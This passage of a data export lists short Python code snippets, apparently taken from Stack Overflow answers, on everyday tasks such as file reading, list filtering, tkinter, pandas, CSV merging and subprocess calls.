</snippet></ROW><ROW><id>20412311</id><snippet>tempString</snippet></ROW><ROW><id>20412311</id><snippet>string</snippet></ROW><ROW><id>20412311</id><snippet>addWord</snippet></ROW><ROW><id>20412311</id><snippet>tempString</snippet></ROW><ROW><id>20412311</id><snippet>    tempString[word] = content
</snippet></ROW><ROW><id>20412311</id><snippet>string</snippet></ROW><ROW><id>20412311</id><snippet>string</snippet></ROW><ROW><id>20412311</id><snippet>import copy
tempString = copy.deepcopy(string)
</snippet></ROW><ROW><id>20412311</id><snippet>string</snippet></ROW><ROW><id>20412314</id><snippet>opening = open('filename.txt') # "w" is not necessary since you're opening it read-only
a = [b.split() for b in opening.readlines()] # create a list of each line and strip the newline "\n" character

print(a[0]) # print first line
print(a[1]) # print second line
</snippet></ROW><ROW><id>20412609</id><snippet>for i in range(0,29):
</snippet></ROW><ROW><id>20412609</id><snippet>range(30)</snippet></ROW><ROW><id>20412609</id><snippet>reader</snippet></ROW><ROW><id>20412628</id><snippet>IX</snippet></ROW><ROW><id>20412628</id><snippet>IY</snippet></ROW><ROW><id>20412628</id><snippet>IXY</snippet></ROW><ROW><id>20412628</id><snippet>np.ndarray</snippet></ROW><ROW><id>20412628</id><snippet>np.ndarray</snippet></ROW><ROW><id>20412628</id><snippet>sum(IX)</snippet></ROW><ROW><id>20412628</id><snippet>numpy.int64</snippet></ROW><ROW><id>20412628</id><snippet>IX</snippet></ROW><ROW><id>20412698</id><snippet>&gt;&gt;&gt; for x in loss:
...     if x.startswith(('s','c')): profit.append(x)
... 
&gt;&gt;&gt; profit
['strike', 'customer']
</snippet></ROW><ROW><id>20412742</id><snippet>$ sudo easy_install requests</snippet></ROW><ROW><id>20412742</id><snippet>f.____</snippet></ROW><ROW><id>20412742</id><snippet>urllib.urlretrieve</snippet></ROW><ROW><id>20412742</id><snippet>import urllib2,re,os
#import requests

folder = "FailImages"

if not os.path.exists(folder): # Directory that I want to save the image to
    os.mkdir(folder) # If no directory create it

url = "http://www.google.ca"
source = urllib2.urlopen(url).read()

imgs = re.findall(r'(https?:/)?(/?[\w_\-&amp;%?./]*?)\.(jpg|png|gif)',source, re.M) # regex finds files with .jpg extension


for img in imgs:
    remote = url + img[1] + "." + img[2];
    filename = folder + "/" + img[1].split('/')[-1] + "." + img[2]
    print "Copying from " + remote + " to " + filename
    if not os.path.exists(filename):
        f = open(filename, 'wb')
        f.write(urllib2.urlopen(remote).read())
        #f.write(requests.get(remote).content)
        f.close()
</snippet></ROW><ROW><id>20412777</id><snippet>import string

fileName = raw_input("What file name: ")
lines = []
try:
    file = open(fileName)
    lines = file.readlines()
    file.close()
except:
    print "Unable to open file"
sum = 0
values = 0
if(len(lines) &gt; 0):
    for line in lines:
        value = 0
        try:
            value = int(string.strip(line))
        except ValueError:
            pass
        if(value != 0):
            sum = sum + value
            values += 1
    print "Average = %f for %d lines, sum = %f"%(sum/values,values,sum)
else:
    print "No lines in the file"
</snippet></ROW><ROW><id>20412777</id><snippet>10
20
30
40
50
23
5



asdfadfs

s
</snippet></ROW><ROW><id>20412777</id><snippet>What file name: numbers.txt
Average = 25.000000 for 7 lines, sum = 178.000000
</snippet></ROW><ROW><id>20413061</id><snippet>==</snippet></ROW><ROW><id>20413061</id><snippet>if self.__shift_number == '1':
</snippet></ROW><ROW><id>20413061</id><snippet>=</snippet></ROW><ROW><id>20413061</id><snippet>class Employee:
    def __init__(self, employeeName, employeeShift):
        self.name = employeeName
        self.number = employeeShift

    def set_name(self, nam):
        self.name = nam

    def setnumber(self, num):
        self.number = num

    # Accessor methods
    def get_name(self):
        return self.name

    def get_number(self):
        return self.number

# ProductionWorker class that inherited the Employee class
class ProductionWorker(Employee):
    ##############################################
    def __init__(self, name, shift, payRate):
        self.name = name
    ##############################################
        self.shift_number = shift
        self.pay_rate = payRate

    def set_shift_number(self, shift):
        self.shift_number = shift

    def set_pay_rate(self, pay):
        self.pay_rate = pay

    # Accessor methods
    def get_shift(self):
       if self.shift_number == 1:
            s = 'Day shift'
       ###################################
       elif self.shift_number == 2:
       ###################################
            s = 'Night shift'
       return s 

    def get_pay(self):
        if self.pay_rate &lt;= 5:
            p = 7.50
        elif self.pay_rate &gt; 5 and self.pay_rate &lt;= 15:
            p = 13.50
        ###################################
        elif self.pay_rate &gt;= 20:
        ###################################
            p = 20
        return p

# main module
def main():
    # Prompts the user for employee name, shift and pay rate
    employeeName = raw_input("Please enter the employee name: ")
    print "Please enter which shift the employee works."
    employeeShift = input("1 for day shift, 2 for night shift: ")
    payRate = input("How long has the employee worked here? ")

    # Creates object of ProductionWorker
    worker = ProductionWorker(employeeName, employeeShift, payRate)

    # Displays information
    print "Employee name:", worker.get_name()
    print "Employee shift:", worker.get_shift()
    print "Employee pay rate:", worker.get_pay()

# calls main module
main()
</snippet></ROW><ROW><id>20413061</id><snippet>else</snippet></ROW><ROW><id>20413061</id><snippet>elif</snippet></ROW><ROW><id>20413061</id><snippet>else</snippet></ROW><ROW><id>20413061</id><snippet>__init__</snippet></ROW><ROW><id>20413061</id><snippet>name</snippet></ROW><ROW><id>20413061</id><snippet>ProductionWorker.__init__</snippet></ROW><ROW><id>20413061</id><snippet>worker = ProductionWorker(employeeName, employeeShift, payRate)</snippet></ROW><ROW><id>20413061</id><snippet>ProductionWorker.__init__</snippet></ROW><ROW><id>20413061</id><snippet>ProductionWorker</snippet></ROW><ROW><id>20413061</id><snippet>self.name = name</snippet></ROW><ROW><id>20413065</id><snippet>NewWin.protocol("WM_DELETE_WINDOW", quit_win)</snippet></ROW><ROW><id>20413065</id><snippet>quit_win</snippet></ROW><ROW><id>20413065</id><snippet>close button</snippet></ROW><ROW><id>20413065</id><snippet>import tkinter as tk

root = tk.Tk()
root.title('Main Window')
root.geometry('400x400')

def get_new_win():

    NewWin = tk.Toplevel(root)
    NewWin.title('New Window')
    NewWin.geometry('300x300')
    NewWinButton.config(state='disable')

    def quit_win():
        NewWin.destroy()
        NewWinButton.config(state='normal')

    QuitButton = tk.Button(NewWin,text='Quit',command=quit_win)
    QuitButton.pack()

    NewWin.protocol("WM_DELETE_WINDOW", quit_win) 

NewWinButton = tk.Button(root,text='New Window', command=get_new_win)
NewWinButton.pack()

root.mainloop()
</snippet></ROW><ROW><id>20413065</id><snippet>NewWinButton</snippet></ROW><ROW><id>20413065</id><snippet>pack()</snippet></ROW><ROW><id>20413065</id><snippet>None</snippet></ROW><ROW><id>20413065</id><snippet>NewWinButton = tk.Button(...).pack()
</snippet></ROW><ROW><id>20413065</id><snippet>NewWinButton = tk.Button(...)
NewWinButton.pack()
</snippet></ROW><ROW><id>20413122</id><snippet>any</snippet></ROW><ROW><id>20413122</id><snippet>&gt;&gt;&gt; from collections import namedtuple
&gt;&gt;&gt; A = namedtuple('A', 'x y')
&gt;&gt;&gt; lis = [A(100, 200), A(10, 20), A(1, 2)]
&gt;&gt;&gt; any(a.x==1 for a in lis)
True
&gt;&gt;&gt; [getattr(a, 'x')==1 for a in lis]
[False, False, True]
</snippet></ROW><ROW><id>20413293</id><snippet>In [3]: file_ = open('/etc/services', 'r')

In [4]: file_.readline()
Out[4]: '# Network services, Internet style\n'

In [5]: file_.readline()
Out[5]: '#\n'

In [6]: file_.readline()
Out[6]: '# Note that it is presently the policy of IANA to assign a single well-known\n'

In [7]: file_.seek(-2, 1)
---------------------------------------------------------------------------
UnsupportedOperation                      Traceback (most recent call last)
&lt;ipython-input-7-6122ef700637&gt; in &lt;module&gt;()
----&gt; 1 file_.seek(-2, 1)

UnsupportedOperation: can't do nonzero cur-relative seeks
</snippet></ROW><ROW><id>20413293</id><snippet>In [9]: file_ = open('/etc/services', 'rb')

In [10]: file_.readline()
Out[10]: b'# Network services, Internet style\n'

In [11]: file_.readline()
Out[11]: b'#\n'

In [12]: file_.readline()
Out[12]: b'# Note that it is presently the policy of IANA to assign a single well-known\n'

In [13]: file_.seek(-2, 1)
Out[13]: 112
</snippet></ROW><ROW><id>20413293</id><snippet>In [17]: file_ = io.BytesIO(b'abc def\nghi jkl\nmno pqr\n')

In [18]: file_.readline()
Out[18]: b'abc def\n'

In [19]: file_.seek(-2, 1)
Out[19]: 6
</snippet></ROW><ROW><id>20413384</id><snippet>x</snippet></ROW><ROW><id>20413384</id><snippet>cos(x)</snippet></ROW><ROW><id>20413384</id><snippet>sin(x)</snippet></ROW><ROW><id>20413384</id><snippet>&gt;&gt;&gt; def fromdeg(d):
...     r = d * np.pi / 180.
...     return np.array([np.cos(r), np.sin(r)])
... 
&gt;&gt;&gt; np.linalg.norm(fromdeg(1) - fromdeg(359))
0.03490481287456796
&gt;&gt;&gt; np.linalg.norm(fromdeg(1) - fromdeg(180))
1.9999238461283426
&gt;&gt;&gt; np.linalg.norm(fromdeg(90) - fromdeg(270))
2.0
</snippet></ROW><ROW><id>20413384</id><snippet>norm(a - b)</snippet></ROW><ROW><id>20413384</id><snippet>a</snippet></ROW><ROW><id>20413384</id><snippet>b</snippet></ROW><ROW><id>20413406</id><snippet>filter(None, myList)
</snippet></ROW><ROW><id>20413406</id><snippet>filter()</snippet></ROW><ROW><id>20413406</id><snippet>[t for t in myList if t]
</snippet></ROW><ROW><id>20413406</id><snippet>[t for t in myList if t != ()]
</snippet></ROW><ROW><id>20413406</id><snippet>&gt;&gt;&gt; myList = [(), (), ('',), ('c', 'e'), ('ca', 'ea'), ('d',), ('do',), ('dog', 'ear', 'eat', 'cat', 'car'), ('dogs', 'cars', 'done', 'eats', 'cats', 'ears'), ('don',)]
&gt;&gt;&gt; filter(None, myList)
[('',), ('c', 'e'), ('ca', 'ea'), ('d',), ('do',), ('dog', 'ear', 'eat', 'cat', 'car'), ('dogs', 'cars', 'done', 'eats', 'cats', 'ears'), ('don',)]
&gt;&gt;&gt; [t for t in myList if t]
[('',), ('c', 'e'), ('ca', 'ea'), ('d',), ('do',), ('dog', 'ear', 'eat', 'cat', 'car'), ('dogs', 'cars', 'done', 'eats', 'cats', 'ears'), ('don',)]
&gt;&gt;&gt; [t for t in myList if t != ()]
[('',), ('c', 'e'), ('ca', 'ea'), ('d',), ('do',), ('dog', 'ear', 'eat', 'cat', 'car'), ('dogs', 'cars', 'done', 'eats', 'cats', 'ears'), ('don',)]
</snippet></ROW><ROW><id>20413406</id><snippet>filter()</snippet></ROW><ROW><id>20413406</id><snippet>&gt;&gt;&gt; timeit.timeit('filter(None, myList)', 'from __main__ import myList')
0.637274980545044
&gt;&gt;&gt; timeit.timeit('[t for t in myList if t]', 'from __main__ import myList')
1.243359088897705
&gt;&gt;&gt; timeit.timeit('[t for t in myList if t != ()]', 'from __main__ import myList')
1.4746298789978027
</snippet></ROW><ROW><id>20413406</id><snippet>&gt;&gt;&gt; timeit.timeit('list(filter(None, myList))', 'from __main__ import myList')
1.5365421772003174
&gt;&gt;&gt; timeit.timeit('[t for t in myList if t]', 'from __main__ import myList')
1.29734206199646
</snippet></ROW><ROW><id>20413436</id><snippet>admin.site.register(Regional_Units)
admin.site.register(Regional_Units_Resource_Admin)
</snippet></ROW><ROW><id>20413436</id><snippet>admin.site.register(Regional_Units, Regional_Units_Resource_Admin)
</snippet></ROW><ROW><id>20413436</id><snippet>register()</snippet></ROW><ROW><id>20413436</id><snippet>_</snippet></ROW><ROW><id>20413677</id><snippet>def listInList(a, list, memory):
    if not list:
        return False
    elif str(list) in memory:
        return memory[str(list)]
    else:
        if list in a:
            memory[str(list)] = True
            return True
        else:
            for i in range(1,len(list)):
                if listInList(a, list[i:], memory) and listInList(a, list[:i], memory):
                    memory[str(list)] = True
                    return True
            memory[str(list)] = False
            return False

def check(a, b):
    res = []
    for elem in b:
        if listInList(a, elem, {}):
            res += [elem]
    return res

w= [
     ['sta'],
     ['co', 'si'],
     ['non'],
     ['si'],
     ['puo'],
     ['ap', 'ri', 're'],
     ['ve', 'dia', 'mo'],
     ['co', 'sa'],
     ['ci'],
     ['pot', 'reb', 'be']
   ]
m=[
     ['sta', 'co'],
     ['puo', 'ap', 'ri', 're'],
     ['ve'],
     ['dia', 'mo'],
     ['co'],
     ['sa'],
     ['ci', 'pot', 'reb', 'be']
  ]
print check(w,m)
</snippet></ROW><ROW><id>20413677</id><snippet>[['puo', 'ap', 'ri', 're'], ['ci', 'pot', 'reb', 'be']]
</snippet></ROW><ROW><id>20413812</id><snippet>In [11]: s = pd.Series([3, 1, 2], [[1, 1, 2], [1, 3, 1]])

In [12]: s.sort()

In [13]: s
Out[13]: 
1  3    1
2  1    2
1  1    3
dtype: int64
</snippet></ROW><ROW><id>20413812</id><snippet>In [14]: s.order()
Out[14]: 
1  3    1
2  1    2
1  1    3
dtype: int64
</snippet></ROW><ROW><id>20413812</id><snippet>In [21]: s.reset_index(name='s').groupby('level_0').apply(lambda s: s.sort('s')).set_index(['level_0', 'level_1'])['s']
Out[21]: 
level_0  level_1
1        3          1
         1          3
2        1          2
Name: 0, dtype: int64
</snippet></ROW><ROW><id>20413829</id><snippet>x</snippet></ROW><ROW><id>20413829</id><snippet>x[0]</snippet></ROW><ROW><id>20413829</id><snippet>y[0]</snippet></ROW><ROW><id>20413829</id><snippet>y</snippet></ROW><ROW><id>20413829</id><snippet>y[0]</snippet></ROW><ROW><id>20413829</id><snippet>x[0]</snippet></ROW><ROW><id>20414437</id><snippet>PYTHONPATH</snippet></ROW><ROW><id>20414437</id><snippet>pip list</snippet></ROW><ROW><id>20414437</id><snippet>pip show flask</snippet></ROW><ROW><id>20414437</id><snippet>pip install flask</snippet></ROW><ROW><id>20414470</id><snippet>find_all</snippet></ROW><ROW><id>20414470</id><snippet>find</snippet></ROW><ROW><id>20414470</id><snippet>#Import libraries
import urllib2
from bs4 import BeautifulSoup
import datetime

#create soup
soup = BeautifulSoup(urllib2.urlopen('https://www.theice.com/marketdata/DelayedMarkets.shtml?productId=3418&amp;hubId=4080').read())
table = soup.find('table', {"class":"data default borderless"})

#Find and record time
time_idx = -1
for idx, th in enumerate(table.find_all('th')):
    # Find the column index of Time
    if th.get_text() == 'Time':
        time_idx = idx
        break

timevar = []
for tr in table.find_all('tr'):
    # Extract the content of each column in a list
    td_contents = [td.get_text() for td in tr.find_all('td')]
    # If this row matches our requirement, take the Time column
    if 'Dec13' in td_contents:
        time_str = td_contents[time_idx]
        # This will capture Thu Dec 05 16:26:24 EST 2013 GMT, convert to datetime object
        time_obj = datetime.datetime.strptime(time_str,'%a %b %d %H:%M:%S EST %Y GMT')
        timevar.append(datetime.datetime.strftime(time_obj,'%x'))

#create output document
with open('CarbonPrice.txt','a') as f:
    f.write(timevar[0])
</snippet></ROW><ROW><id>20414663</id><snippet>import csv
from collections import OrderedDict

with open('b.csv', 'rb') as f:
    r = csv.reader(f)
    dict2 = {row[0]: row[1:] for row in r}

with open('a.csv', 'rb') as f:
    r = csv.reader(f)
    dict1 = OrderedDict((row[0], row[1:]) for row in r)

result = OrderedDict()
for d in (dict1, dict2):
    for key, value in d.iteritems():
        result.setdefault(key, []).extend(value)

with open('ab_combined.csv', 'wb') as f:
    w = csv.writer(f)
    for key, value in result.iteritems():
        w.writerow([key] + value)
</snippet></ROW><ROW><id>20414663</id><snippet>john,red,34
andrew,green,18
tonny,black,50,driver,new york
jack,yellow,27
phill,orange,45,scientist,boston
kurt,blue,29
mike,pink,61
</snippet></ROW><ROW><id>20414663</id><snippet>dict2</snippet></ROW><ROW><id>20414663</id><snippet>dict1</snippet></ROW><ROW><id>20414753</id><snippet>sudo -u "$SUDO_USER" command</snippet></ROW><ROW><id>20414753</id><snippet># if we're root from sudo, run this script as the original user instead
[[ "$(id -u)" = "0" &amp;&amp; -n "${SUDO_USER:-}" ]] &amp;&amp; exec sudo -u "$SUDO_USER" "$0" "$@"
</snippet></ROW><ROW><id>20414753</id><snippet>#!/bin/bash -u
[[ "$(id -u)" = "0" &amp;&amp; -n "${SUDO_USER:-}" ]] &amp;&amp; exec sudo -u "$SUDO_USER" "$0" "$@"
id -u
</snippet></ROW><ROW><id>20414871</id><snippet>[s for s in partyinfo[partyinfo.index('Defendant'):] if s != 'Defendant']
</snippet></ROW><ROW><id>20414871</id><snippet>partyinfo</snippet></ROW><ROW><id>20414871</id><snippet>'Defendant'</snippet></ROW><ROW><id>20414871</id><snippet>'Defendant'</snippet></ROW><ROW><id>20414871</id><snippet>'Defendant'</snippet></ROW><ROW><id>20414871</id><snippet>partyinfo</snippet></ROW><ROW><id>20414871</id><snippet>'Defendant'</snippet></ROW><ROW><id>20415034</id><snippet>import csv
import json
import oauth2 as oauth
import urllib

# I don't if any of these are actually needed?
import sys
import requests
import time

CONSUMER_KEY    = ''
CONSUMER_SECRET = ''
ACCESS_KEY      = ''
ACCESS_SECRET   = ''

class TwitterSearch:
    def __init__(self,
        ckey    = CONSUMER_KEY,
        csecret = CONSUMER_SECRET,
        akey    = ACCESS_KEY,
        asecret = ACCESS_SECRET,
        query   = 'https://api.twitter.com/1.1/search/tweets.{mode}?{query}'
    ):
        consumer     = oauth.Consumer(key=ckey, secret=csecret)
        access_token = oauth.Token(key=akey, secret=asecret)
        self.client  = oauth.Client(consumer, access_token)
        self.query   = query

    def search(self, q, mode='json', **queryargs):
        queryargs['q'] = q
        query = urllib.urlencode(queryargs)
        return self.client.request(self.query.format(query=query, mode=mode))

def write_csv(fname, rows, header=None, append=False, **kwargs):
    filemode = 'ab' if append else 'wb'
    with open(fname, filemode) as outf:
        out_csv = csv.writer(outf, **kwargs)
        if header:
            out_csv.writerow(header)
        out_csv.writerows(rows)

def main():
    ts = TwitterSearch()
    response, data = ts.search('@gmail.com', result_type='recent')
    js = json.loads(data)

    # This _should_ work, based on sample data from
    # https://dev.twitter.com/docs/api/1.1/get/search/tweets
    messages = ([msg['created_at'], msg['txt'], msg['user']['id']] for msg in js.get('statuses', []))

    write_csv('twitter_gmail.csv', messages, append=True)

if __name__ == "__main__":
    main()
</snippet></ROW><ROW><id>20415055</id><snippet>def request_seen(self, request):
    fp = request_fingerprint(request)
    added = self.server.sadd(self.key, fp)
    return not added
</snippet></ROW><ROW><id>20415079</id><snippet>input</snippet></ROW><ROW><id>20415079</id><snippet>raw_input</snippet></ROW><ROW><id>20415079</id><snippet>input</snippet></ROW><ROW><id>20415079</id><snippet>eval(raw_input('&gt;'))</snippet></ROW><ROW><id>20415079</id><snippet>input</snippet></ROW><ROW><id>20415079</id><snippet>raw_input</snippet></ROW><ROW><id>20415079</id><snippet>input</snippet></ROW><ROW><id>20415518</id><snippet>subprocess.call</snippet></ROW><ROW><id>20415518</id><snippet>stdout</snippet></ROW><ROW><id>20415518</id><snippet>Popen.communicate()</snippet></ROW><ROW><id>20415518</id><snippet>pipe = subprocess.Popen(
     ["metaflac", "--show-tag=title", filename], stdout=subprocess.PIPE)
title, error = pipe.communicate()
</snippet></ROW><ROW><id>20415591</id><snippet>subprocees</snippet></ROW><ROW><id>20415591</id><snippet>import subporcess

cmd = "xterm -hold -e scipt.sh"
# no block, it start a sub process.
p = subprocess.Popen(cmd , shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

# and you can block util the cmd execute finish
p.wait()
# or stdout, stderr = p.communicate()
</snippet></ROW><ROW><id>20415622</id><snippet>:</snippet></ROW><ROW><id>20415622</id><snippet>text = line.split(": ", 1)[1]
</snippet></ROW><ROW><id>20415728</id><snippet>data</snippet></ROW><ROW><id>20415728</id><snippet>set(data)</snippet></ROW><ROW><id>20415728</id><snippet>sort()</snippet></ROW><ROW><id>20415728</id><snippet>for</snippet></ROW><ROW><id>20415728</id><snippet>data.count(&lt;letter in the list&gt;)</snippet></ROW><ROW><id>20415728</id><snippet>for</snippet></ROW><ROW><id>20415831</id><snippet>x + ((0,0),)
</snippet></ROW><ROW><id>20415831</id><snippet>((1, 2), (3, 4), (5, 6), (8, 9), (0, 0))
</snippet></ROW><ROW><id>20415831</id><snippet>(x,)</snippet></ROW><ROW><id>20415831</id><snippet>(x)</snippet></ROW><ROW><id>20415831</id><snippet>x</snippet></ROW><ROW><id>20415831</id><snippet>((0, 0),)</snippet></ROW><ROW><id>20415831</id><snippet>(0, 0)</snippet></ROW><ROW><id>20415969</id><snippet>@app.route('/user/&lt;user_name&gt;/&lt;param&gt;')
def show_param(user_name, param):
    if ' ' in param:
        param = param.replace(' ', '-')
        return redirect(url_for('show_param'), user_name=user_name, param=param)
</snippet></ROW><ROW><id>20416097</id><snippet>with open('trash.txt', 'r') as fin:
    for line in sorted(fin, key=lambda x:x.split(',')[1]):
        print line
</snippet></ROW><ROW><id>20416263</id><snippet>datetime.datetime</snippet></ROW><ROW><id>20416263</id><snippet>atexit</snippet></ROW><ROW><id>20416263</id><snippet>IPython</snippet></ROW><ROW><id>20416263</id><snippet>sqlite3</snippet></ROW><ROW><id>20416263</id><snippet>datetime.datetime</snippet></ROW><ROW><id>20416263</id><snippet>orig_datetime = datetime.datetime  # new
datetime.datetime = datetimeMock   # the same

try:
    # start processing
    ...
finally:
    datetime.datetime = orig_datetime
</snippet></ROW><ROW><id>20416402</id><snippet>d = {"a": 1, "b": 2, "c": 3}
print(d)
</snippet></ROW><ROW><id>20416402</id><snippet>$ python3.4 test.py
{'a': 1, 'c': 3, 'b': 2}
$ python3.4 test.py
{'c': 3, 'b': 2, 'a': 1}
$ python3.4 test.py
{'b': 2, 'c': 3, 'a': 1}
</snippet></ROW><ROW><id>20416402</id><snippet>-R</snippet></ROW><ROW><id>20416409</id><snippet>r3 = Rectangle(3, 5, 10, 20)
</snippet></ROW><ROW><id>20416410</id><snippet>payload = {  
   'dummy::login_form': 1,  
   'form::login_form': 'login_form',  
   'xurl': '/',  
   'master_product': 150,  
   'vendor': 'cbssports',  
   'userid': YOUR EMAIL HERE,  
   'password': YOUR PASSWORD HERE,  
}
</snippet></ROW><ROW><id>20416539</id><snippet>def metadata():
    # all of your current code

    # add this to the bottom
    return tracknumber, artist, title

# save the returned values to global variables
tracknumber, artist, title = metadata()
</snippet></ROW><ROW><id>20416539</id><snippet>def metadata():
    global tracknumber, artist, title
    # all of your current code
</snippet></ROW><ROW><id>20416681</id><snippet>import matplotlib.pyplot as plt
import numpy as np

x = np.linspace(0, 2*np.pi, 100)

fig = plt.figure()
ax = fig.add_subplot(111)

ax.plot(x, np.sin(x))

ax.grid(True)
ax.set_xticklabels([])


plt.show()
</snippet></ROW><ROW><id>20416681</id><snippet>for tic in ax.xaxis.get_major_ticks():
    tic.tick1On = tic.tick2On = False
</snippet></ROW><ROW><id>20416681</id><snippet>ax.set_xticklabels([])</snippet></ROW><ROW><id>20416681</id><snippet>tic.label1On = tic.label2On = False</snippet></ROW><ROW><id>20416681</id><snippet>import matplotlib.pyplot as plt
import numpy as np

x = np.linspace(0, 2*np.pi, 100)

fig = plt.figure()
ax = fig.add_subplot(111)

ax.plot(x, np.sin(x))

ax.grid(True)
for tic in ax.xaxis.get_major_ticks():
    tic.tick1On = tic.tick2On = False
    tic.label1On = tic.label2On = False

plt.show()
</snippet></ROW><ROW><id>20416837</id><snippet>if (x%2 == 0):
    print "x is even"
else:
    print "x is odd"
</snippet></ROW><ROW><id>20417005</id><snippet>def GetSum(n, arr):
    if len(arr) == 0 and n != 0:
        return False
    return (n == 0 or  
      GetSum(n, arr[1:]) or  
      GetSum(n-arr[0], arr[1:]))

def ArrayAddition(arr):
    arrs = sorted(arr)
    return GetSum(arrs[-1], arrs[:-1])

print ArrayAddition([2,95,96,97,98,99,100])
</snippet></ROW><ROW><id>20417489</id><snippet>&gt;&gt;&gt; zip(a_list,a_list[1:],a_list[2:])
[(10, 4, 18), (4, 18, 2), (18, 2, 6), (2, 6, 19), (6, 19, 24), (19, 24, 1), (24, 1, 20)]
</snippet></ROW><ROW><id>20417489</id><snippet>In [6]: %timeit [a_list[i:i+n] for i in xrange(len(a_list)-n+1)]
100000 loops, best of 3: 9.61 us per loop

In [7]: %timeit zip(a_list,a_list[1:],a_list[2:])
100000 loops, best of 3: 5.23 us per loop
</snippet></ROW><ROW><id>20417489</id><snippet>&gt;&gt;&gt; zip(*[a_list[i:] for i in range(3)]) #3 (or 2, 4, 5, etc)is the length of step
</snippet></ROW><ROW><id>20417489</id><snippet>list</snippet></ROW><ROW><id>20417489</id><snippet>numpy</snippet></ROW><ROW><id>20417489</id><snippet>import numpy as np
lista=np.array(lis)
def rolling_window(a, window):
    shape = a.shape[:-1] + (a.shape[-1] - window + 1, window)
    strides = a.strides + (a.strides[-1],)
    return np.lib.stride_tricks.as_strided(a, shape=shape, strides=strides)

%timeit [lis[i:i+n] for i in xrange(len(lis)-n+1)] 
%timeit rolling_window(lista, n)

1 loops, best of 3: 171 ms per loop
100000 loops, best of 3: 19.7 µs per loop
</snippet></ROW><ROW><id>20417494</id><snippet>for</snippet></ROW><ROW><id>20417494</id><snippet>&gt;&gt;&gt; [(x, y) for x in range(0, 31, 10) for y in range(0, 21, 20)]
[(0, 0), (0, 20), (10, 0), (10, 20), (20, 0), (20, 20), (30, 0), (30, 20)]
</snippet></ROW><ROW><id>20417494</id><snippet>range</snippet></ROW><ROW><id>20417494</id><snippet>def coords(split_image, totalpixels):
    xstop = totalpixels[0] - split_image[0]
    ystop = totalpixels[1] - split_image[1]
    return [(x, y) for x in range(0, xstop, split_image[0])
            for y in range(0, ystop, split_image[1])]
</snippet></ROW><ROW><id>20417494</id><snippet>&gt;&gt;&gt; coords( (10, 20), (45, 45) )
[(0, 0), (0, 20), (10, 0), (10, 20), (20, 0), (20, 20), (30, 0), (30, 20)]
</snippet></ROW><ROW><id>20417624</id><snippet>import subprocess
subprocess.Popen(['scrapy', 'runspider', 'myspider.py', 'URL_LIST_USER_INPUT'])
</snippet></ROW><ROW><id>20417624</id><snippet>import sys
class MySpider(CrawlSpider):
    def __init__(self):
        ......
        # store the urls that you pass to the spider in 'controlspider.py'
        self.urls = sys.argv
</snippet></ROW><ROW><id>20417792</id><snippet>whichSelected</snippet></ROW><ROW><id>20417792</id><snippet>var</snippet></ROW><ROW><id>20417792</id><snippet>value = var.get()
if value == 1:
    print "Average Grayscale"
elif value == 2:
    print "Lightness Grayscale"
...
</snippet></ROW><ROW><id>20417792</id><snippet>False</snippet></ROW><ROW><id>20417792</id><snippet>True</snippet></ROW><ROW><id>20417792</id><snippet>True</snippet></ROW><ROW><id>20417792</id><snippet>command</snippet></ROW><ROW><id>20417792</id><snippet>None</snippet></ROW><ROW><id>20417792</id><snippet>True</snippet></ROW><ROW><id>20417792</id><snippet>lambda</snippet></ROW><ROW><id>20417792</id><snippet>True</snippet></ROW><ROW><id>20417792</id><snippet>option1 = tkinter.Radiobutton(window, text='Average Grayscale',
                                      variable=var,
                                      value=1,
                                      command=lambda: whichSelected(1))
</snippet></ROW><ROW><id>20417792</id><snippet>lambda</snippet></ROW><ROW><id>20417792</id><snippet>tkinter</snippet></ROW><ROW><id>20418114</id><snippet>map(min, [nums[x:x+window] for x in xrange(len(nums)-(window-1))])
</snippet></ROW><ROW><id>20418114</id><snippet>[min(nums[x:x+window]) for x in xrange(len(nums)-(window+1))] 
</snippet></ROW><ROW><id>20418114</id><snippet>with open ("file") as f1:
    n = int(f1.readline())
    numbers_list = map(int, f1.readline().split(' ')) 
</snippet></ROW><ROW><id>20418255</id><snippet>report4list = [report4data.readlines()]
appendata = report4list.append(AorB+"Poverty level")
report4file.write(str(appendata))
</snippet></ROW><ROW><id>20418255</id><snippet>.readlines()</snippet></ROW><ROW><id>20418255</id><snippet>.append()</snippet></ROW><ROW><id>20418255</id><snippet>appendata</snippet></ROW><ROW><id>20418255</id><snippet>None</snippet></ROW><ROW><id>20418255</id><snippet>report4list = report4data.readlines()
report4list.append(AorB+"Poverty level")
report4file.writelines(report4list)
</snippet></ROW><ROW><id>20418255</id><snippet>def read_report(filename):
    """Read file and return a list of the lines, split on whitespace"""
    with open(filename) as file:
        return [line.strip().split() for line in file]

def above_povertylevel(state, amount, divisor):
    """Check whether the quotient amount/divisor is above poverty level for a given state"""
    default = 3180
    levels = {"HI": 3600, "AK": 3980}
    return amount/divisor &gt;= levels.get(state, default)

def update_report(infile, outfile):
    """Read report from infile, output updated report in outfile"""
    report = read_report(infile)
    with open(outfile, "w") as output:
        for dataset in report:
            if above_povertylevel(dataset[3], int(dataset[2]), int(dataset[1])):
                dataset.append("Above Poverty Level\n")
            else:
                dataset.append("Below Poverty Level\n")
            output.write(" ".join(dataset))

update_report("report4.txt", "output.txt")
</snippet></ROW><ROW><id>20418262</id><snippet>    destination = open(directory + newfilename, 'wb+')
    for chunk in docfile.chunks():
        destination.write(chunk)
    destination.close()
</snippet></ROW><ROW><id>20418491</id><snippet>jobsubmit = JobSubmitForm(request.FILES)
</snippet></ROW><ROW><id>20418491</id><snippet>jobsubmit = JobSubmitForm(request.POST, request.FILES)
</snippet></ROW><ROW><id>20418743</id><snippet>class collections.deque([iterable[, maxlen]])
</snippet></ROW><ROW><id>20418743</id><snippet>__init__</snippet></ROW><ROW><id>20418743</id><snippet>class lista(deque):
    def __init__(self, iterable=(), maxlen=None):
        deque.__init__(self, iterable, maxlen)
        self.lib = defaultdict(dict)
</snippet></ROW><ROW><id>20419088</id><snippet>timeout</snippet></ROW><ROW><id>20419131</id><snippet>libssl1_0_0</snippet></ROW><ROW><id>20419131</id><snippet>/usr/local/ssl/lib</snippet></ROW><ROW><id>20419131</id><snippet>$LD_LIBRARY_PATH</snippet></ROW><ROW><id>20419146</id><snippet>os.path.getsize()</snippet></ROW><ROW><id>20419146</id><snippet> filepath='/path/to/files'    
 files = sorted([ 
    f for f in os.listdir(filepath) if f.startswith('spam')])


 recent = files[-1]

 filesize = os.path.getsize(os.path.join(filepath, recent))
</snippet></ROW><ROW><id>20419303</id><snippet>app.debug = True
</snippet></ROW><ROW><id>20419418</id><snippet>df.columns = df.iloc[0]
